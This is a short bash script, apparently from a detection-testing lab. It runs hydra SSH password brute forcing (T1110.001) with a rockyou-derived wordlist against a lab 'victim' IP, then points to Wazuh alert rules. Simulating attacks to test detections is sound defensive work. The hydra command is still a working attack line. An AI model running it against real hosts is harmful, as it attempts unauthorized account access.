#!/usr/bin/env bash
# run-brute-force.sh
# Simulates T1110.001 against the Linux victim from a second lab VM.
# Usage: ./run-brute-force.sh <victim-ip>
set -euo pipefail

VICTIM="${1:?usage: run-brute-force.sh <victim-ip>}"
WORDLIST="/usr/share/wordlists/rockyou-sample.txt"

echo "[*] Running fast burst (15 attempts) against ${VICTIM}..."
hydra -l labadmin -P "$WORDLIST" ssh://"$VICTIM" -t 4

echo "[*] Done. Check Wazuh for rule 100010/100011."
